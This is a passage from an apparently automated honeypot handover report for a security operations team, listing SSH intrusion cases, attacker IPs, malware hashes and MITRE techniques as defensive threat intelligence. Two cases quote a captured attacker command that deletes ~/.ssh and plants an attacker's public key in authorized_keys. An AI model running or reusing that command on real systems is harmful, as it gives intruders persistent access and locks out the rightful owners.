| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:04:06` | `cowrie.session.connect` |
| `2026-05-29 11:04:06` | `cowrie.client.version` |
| `2026-05-29 11:04:16` | `cowrie.client.kex` |
| `2026-05-29 11:04:44` | `cowrie.login.success` |
| `2026-05-29 11:05:09` | `cowrie.session.params` |
| `2026-05-29 11:05:09` | `cowrie.command.input` |
| `2026-05-29 11:05:42` | `cowrie.log.closed` |
| `2026-05-29 11:05:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1020d017064

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:04 |
| **Last Seen** | 2026-05-29 11:06 |
| **Session Duration** | 122s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:04:16` | `cowrie.session.connect` |
| `2026-05-29 11:05:08` | `cowrie.client.version` |
| `2026-05-29 11:05:08` | `cowrie.client.kex` |
| `2026-05-29 11:06:02` | `cowrie.login.success` |
| `2026-05-29 11:06:16` | `cowrie.session.params` |
| `2026-05-29 11:06:16` | `cowrie.command.input` |
| `2026-05-29 11:06:18` | `cowrie.log.closed` |
| `2026-05-29 11:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-070147d5eab6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:04 |
| **Last Seen** | 2026-05-29 11:06 |
| **Session Duration** | 122s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:04:17` | `cowrie.session.connect` |
| `2026-05-29 11:04:18` | `cowrie.client.version` |
| `2026-05-29 11:05:16` | `cowrie.client.kex` |
| `2026-05-29 11:06:01` | `cowrie.login.success` |
| `2026-05-29 11:06:16` | `cowrie.session.params` |
| `2026-05-29 11:06:16` | `cowrie.command.input` |
| `2026-05-29 11:06:18` | `cowrie.log.closed` |
| `2026-05-29 11:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-313771d5da28

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:04 |
| **Last Seen** | 2026-05-29 11:06 |
| **Session Duration** | 86s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:04:36` | `cowrie.session.connect` |
| `2026-05-29 11:04:37` | `cowrie.client.version` |
| `2026-05-29 11:04:38` | `cowrie.client.kex` |
| `2026-05-29 11:05:15` | `cowrie.login.success` |
| `2026-05-29 11:05:44` | `cowrie.session.params` |
| `2026-05-29 11:05:44` | `cowrie.command.input` |
| `2026-05-29 11:06:02` | `cowrie.log.closed` |
| `2026-05-29 11:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1883eda0472c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:04 |
| **Last Seen** | 2026-05-29 11:06 |
| **Session Duration** | 97s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:04:49` | `cowrie.session.connect` |
| `2026-05-29 11:04:49` | `cowrie.client.version` |
| `2026-05-29 11:05:05` | `cowrie.client.kex` |
| `2026-05-29 11:05:53` | `cowrie.login.success` |
| `2026-05-29 11:06:14` | `cowrie.session.params` |
| `2026-05-29 11:06:14` | `cowrie.command.input` |
| `2026-05-29 11:06:16` | `cowrie.log.closed` |
| `2026-05-29 11:06:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-890a775bec17

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:05 |
| **Last Seen** | 2026-05-29 11:11 |
| **Session Duration** | 400s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:05:05` | `cowrie.session.connect` |
| `2026-05-29 11:05:05` | `cowrie.client.version` |
| `2026-05-29 11:05:12` | `cowrie.client.kex` |
| `2026-05-29 11:06:45` | `cowrie.login.success` |
| `2026-05-29 11:11:35` | `cowrie.session.params` |
| `2026-05-29 11:11:35` | `cowrie.command.input` |
| `2026-05-29 11:11:45` | `cowrie.log.closed` |
| `2026-05-29 11:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c318ce60d4e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:05 |
| **Last Seen** | 2026-05-29 11:06 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:05:31` | `cowrie.session.connect` |
| `2026-05-29 11:05:49` | `cowrie.client.version` |
| `2026-05-29 11:05:49` | `cowrie.client.kex` |
| `2026-05-29 11:06:17` | `cowrie.login.success` |
| `2026-05-29 11:06:21` | `cowrie.session.params` |
| `2026-05-29 11:06:21` | `cowrie.command.input` |
| `2026-05-29 11:06:24` | `cowrie.log.closed` |
| `2026-05-29 11:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ccfe1da4a7

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:06 |
| **Last Seen** | 2026-05-29 11:06 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:06:29` | `cowrie.session.connect` |
| `2026-05-29 11:06:29` | `cowrie.client.version` |
| `2026-05-29 11:06:29` | `cowrie.client.kex` |
| `2026-05-29 11:06:49` | `cowrie.login.success` |
| `2026-05-29 11:06:50` | `cowrie.session.params` |
| `2026-05-29 11:06:50` | `cowrie.command.input` |
| `2026-05-29 11:06:53` | `cowrie.log.closed` |
| `2026-05-29 11:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e08ae19b4660

| Field | Detail |
|---|---|
| **Source IP** | `120.48.115[.]34` |
| **First Seen** | 2026-05-29 11:06 |
| **Last Seen** | 2026-05-29 11:07 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 11:06:44` | `cowrie.session.connect` |
| `2026-05-29 11:06:45` | `cowrie.client.version` |
| `2026-05-29 11:06:46` | `cowrie.client.kex` |
| `2026-05-29 11:07:25` | `cowrie.login.success` |
| `2026-05-29 11:07:26` | `cowrie.session.params` |
| `2026-05-29 11:07:26` | `cowrie.command.input` |
| `2026-05-29 11:07:26` | `cowrie.log.closed` |
| `2026-05-29 11:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.115[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.48.115[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1423096fff26

| Field | Detail |
|---|---|
| **Source IP** | `103.171.85[.]117` |
| **First Seen** | 2026-05-29 12:30 |
| **Last Seen** | 2026-05-29 12:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 12:30:59` | `cowrie.session.connect` |
| `2026-05-29 12:30:59` | `cowrie.client.version` |
| `2026-05-29 12:30:59` | `cowrie.client.kex` |
| `2026-05-29 12:31:00` | `cowrie.login.success` |
| `2026-05-29 12:31:00` | `cowrie.session.params` |
| `2026-05-29 12:31:00` | `cowrie.command.input` |
| `2026-05-29 12:31:00` | `cowrie.command.failed` |
| `2026-05-29 12:31:00` | `cowrie.log.closed` |
| `2026-05-29 12:31:00` | `cowrie.session.params` |
| `2026-05-29 12:31:00` | `cowrie.command.input` |
| `2026-05-29 12:31:00` | `cowrie.session.file_download` |
| `2026-05-29 12:31:00` | `cowrie.log.closed` |
| `2026-05-29 12:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.85[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.171.85[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4633bc876f1a

| Field | Detail |
|---|---|
| **Source IP** | `103.171.85[.]117` |
| **First Seen** | 2026-05-29 12:31 |
| **Last Seen** | 2026-05-29 12:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 12:31:02` | `cowrie.session.connect` |
| `2026-05-29 12:31:02` | `cowrie.client.version` |
| `2026-05-29 12:31:02` | `cowrie.client.kex` |
| `2026-05-29 12:31:03` | `cowrie.login.success` |
| `2026-05-29 12:31:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.85[.]117` to AbuseIPDB if not already reported
- [ ] Block `103.171.85[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1cbe336e747

| Field | Detail |
|---|---|
| **Source IP** | `157.10.160[.]222` |
| **First Seen** | 2026-05-29 12:37 |
| **Last Seen** | 2026-05-29 12:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 12:37:11` | `cowrie.session.connect` |
| `2026-05-29 12:37:11` | `cowrie.client.version` |
| `2026-05-29 12:37:11` | `cowrie.client.kex` |
| `2026-05-29 12:37:12` | `cowrie.login.success` |
| `2026-05-29 12:37:12` | `cowrie.session.params` |
| `2026-05-29 12:37:12` | `cowrie.command.input` |
| `2026-05-29 12:37:12` | `cowrie.command.failed` |
| `2026-05-29 12:37:13` | `cowrie.log.closed` |
| `2026-05-29 12:37:13` | `cowrie.session.params` |
| `2026-05-29 12:37:13` | `cowrie.command.input` |
| `2026-05-29 12:37:13` | `cowrie.session.file_download` |
| `2026-05-29 12:37:13` | `cowrie.log.closed` |
| `2026-05-29 12:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.160[.]222` to AbuseIPDB if not already reported
- [ ] Block `157.10.160[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9454ed22b807

| Field | Detail |
|---|---|
| **Source IP** | `157.10.160[.]222` |
| **First Seen** | 2026-05-29 12:37 |
| **Last Seen** | 2026-05-29 12:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 12:37:16` | `cowrie.session.connect` |
| `2026-05-29 12:37:16` | `cowrie.client.version` |
| `2026-05-29 12:37:16` | `cowrie.client.kex` |
| `2026-05-29 12:37:16` | `cowrie.login.success` |
| `2026-05-29 12:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.160[.]222` to AbuseIPDB if not already reported
- [ ] Block `157.10.160[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `149.255.39[.]70` | **413** | 2026-05-29 08:10 | 2026-05-29 12:47 | 255m | 0 | `T1592` | 🟠 MEDIUM |
| `120.48.115[.]34` | **225** | 2026-05-29 10:35 | 2026-05-29 11:08 | 381m | 55 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `135.148.33[.]168` | **37** | 2026-05-29 08:19 | 2026-05-29 12:42 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `206.189.25[.]100` | **29** | 2026-05-29 09:44 | 2026-05-29 12:18 | 19m | 0 | `T1592` | 🟠 MEDIUM |
| `101.206.107[.]245` | **4** | 2026-05-29 09:19 | 2026-05-29 09:21 | 4m | 0 | `T1592` | 🟢 LOW |
| `118.194.234[.]29` | **4** | 2026-05-29 12:06 | 2026-05-29 12:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `43.240.55[.]12` | **4** | 2026-05-29 12:45 | 2026-05-29 12:47 | 8m | 0 | `T1592` | 🟢 LOW |
| `138.68.20[.]220` | **3** | 2026-05-29 08:53 | 2026-05-29 10:11 | 3m | 0 | `T1592` | 🟢 LOW |
| `180.188.45[.]179` | **2** | 2026-05-29 12:41 | 2026-05-29 12:47 | 2m | 0 | `T1592` | 🟢 LOW |
| `3.140.255[.]12` | **2** | 2026-05-29 10:03 | 2026-05-29 10:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.149.242[.]166` | **2** | 2026-05-29 09:43 | 2026-05-29 09:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `82.197.58[.]135` | **2** | 2026-05-29 10:46 | 2026-05-29 10:52 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.167.116[.]86` | 1 | 2026-05-29 12:45 | 2026-05-29 12:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.171.85[.]117` | 1 | 2026-05-29 12:31 | 2026-05-29 12:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.116.45[.]128` | 1 | 2026-05-29 11:32 | 2026-05-29 11:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.90[.]166` | 1 | 2026-05-29 10:48 | 2026-05-29 10:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]181` | 1 | 2026-05-29 12:34 | 2026-05-29 12:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.10.160[.]222` | 1 | 2026-05-29 12:37 | 2026-05-29 12:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.220.172[.]154` | 1 | 2026-05-29 12:48 | 2026-05-29 12:48 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.73.148[.]20` | 1 | 2026-05-29 10:46 | 2026-05-29 10:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.141.26[.]222` | 1 | 2026-05-29 09:30 | 2026-05-29 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]46` | 1 | 2026-05-29 08:37 | 2026-05-29 08:37 | 15s | 0 | `T1592` | 🟢 LOW |
| `92.137.239[.]225` | 1 | 2026-05-29 12:03 | 2026-05-29 12:05 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `212.73.148[.]20` | SG | NL MODAT | **100** ⚠️ | 50 |
| `3.141.26[.]222` | US | Amazon Technologies Inc. | **100** ⚠️ | 3 |
| `120.48.90[.]166` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 22 |
| `103.167.116[.]86` | PH | KEITH.NET INCORPORATED t/a KEITH.NET INCORPORATED | **100** ⚠️ | 2 |
| `120.48.115[.]34` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 14 |
| `119.116.45[.]128` | CN | China Unicom Liaoning province network | **100** ⚠️ | 2 |
| `14.103.115[.]181` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `138.68.20[.]220` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `101.206.107[.]245` | CN | UNICOM Sichuan province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 232 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 20 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 793 cases |
| Tool 34  | Credential Extractor        | ✅ 92 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (3.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 23 recon entry/entries in table (12 group(s) consolidating 727 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
